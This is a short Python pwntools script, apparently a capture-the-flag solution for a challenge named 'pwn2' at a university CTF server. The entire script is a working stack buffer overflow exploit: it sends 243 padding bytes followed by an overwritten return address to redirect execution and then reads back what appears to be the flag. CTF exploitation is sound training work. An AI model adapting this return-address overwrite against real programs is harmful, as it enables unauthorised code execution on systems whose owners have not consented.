from pwn import *

DEBUG = False

if DEBUG:
    r = process('./pwn2')
    context.log_level = 'debug'
else:
    r = remote('pwn.ctf.tamu.edu',4322)

land = 0x0804854b

payload = ''
payload += 'a' * 243
payload += p32(land)

print r.recvuntil('me!\n')
r.sendline(payload)
print r.recvuntil('}')
